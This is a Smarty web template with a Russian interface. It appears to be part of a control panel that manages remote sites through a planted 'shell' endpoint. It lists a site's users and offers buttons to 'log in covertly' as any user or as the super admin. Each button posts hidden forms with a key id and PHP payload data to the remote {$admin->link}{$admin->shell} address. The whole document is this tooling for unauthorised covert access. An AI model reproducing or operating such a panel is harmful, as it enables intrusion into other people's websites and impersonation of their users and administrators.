<br />
<form action="http://{$admin->link}{$admin->shell}" enctype="application/x-www-form-urlencoded" method="post" name="logina{$rand_name}" id="logina{$rand_name}" target="_blank">
<input type="hidden" name="id" value="{$admin->keyid}" />
<input type="hidden" name="data" value="{$admin->get_php_a}" />
<input type="hidden" name="hidden" value="on" />
<input type="hidden" name="autorize_submit" value="on" />
</form>
<form action="#" enctype="application/x-www-form-urlencoded" method="post" name="add_suba{$rand_name}" id="add_suba{$rand_name}">
<div align="center"><input type="button" value="войти скрыто под супер админом" onclick="enter2admina{$rand_name}({$user->id});" style="font-size:10px" /></div>
</form>

<br />

<form action="http://{$admin->link}{$admin->shell}" enctype="application/x-www-form-urlencoded" method="post" name="login{$rand_name}" id="login{$rand_name}" target="_blank">
<input type="hidden" name="id" value="{$admin->keyid}" />
<input type="hidden" name="data" value="{$admin->get_php}" />
<input type="hidden" name="login" />
<input type="hidden" name="hidden" value="on" />
<input type="hidden" name="autorize_submit" value="on" />
</form>
<form action="#" enctype="application/x-www-form-urlencoded" method="post" name="add_sub{$rand_name}" id="add_sub{$rand_name}">

<br />
<select id="prot{$rand_name}" name="prot">
<option value="http" selected="selected">http</option>
<option value="https">https</option>
</select>
<br />
<div align="center">Время на сервере: {$users->time|date_format:"%d.%m.%Y %H:%M"}</div>
<br />
<table cellspacing=1 cellpadding=0 style="width:100%" class="t">
	<tr class="t4">
		<td style="vertical-align:middle;text-align:center;" class="bg3">Логин</td>
        <td style="vertical-align:middle;text-align:center; width: 220px;" class="bg3">Последняя активность</td>
		<td style="vertical-align:middle;text-align:center; width: 120px;" class="bg3">&nbsp;</td>
  </tr>
{foreach from=$users item=user name=users}
{if $user->login}
{if $smarty.foreach.users.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bg{$bg}" onMouseMove="this.id = 'bg4'" onMouseOut="this.id = 'bg{$bg}'" style="cursor:pointer;">
		<th>{$user->login}</th>
        <th style="font-size:11px">{$user->expiry_date}</th>
		<th><input type="hidden" name="login{$user->id}" value="{$user->login}" /><input type="button" value="войти скрыто" onclick="enter2admin{$rand_name}({$user->id});" style="font-size:10px" /></th>
  </tr>
{/if}
{/foreach}
</table>
</form>

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Список пользователей - {$admin->link}';

function enter2admin{$rand_name}(id){ldelim}
	document.forms['login{$rand_name}'].action = document.forms['add_sub{$rand_name}'].elements['prot{$rand_name}'].value + '://{$admin->link}{$admin->shell}';
	document.forms['login{$rand_name}'].elements['login'].value = document.forms['add_sub{$rand_name}'].elements['login'+id].value;
	document.forms['login{$rand_name}'].submit();
{rdelim}

function enter2admina{$rand_name}(id){ldelim}
	document.forms['logina{$rand_name}'].action = document.forms['add_sub{$rand_name}'].elements['prot{$rand_name}'].value + '://{$admin->link}{$admin->shell}';
	document.forms['logina{$rand_name}'].submit();
{rdelim}

</script>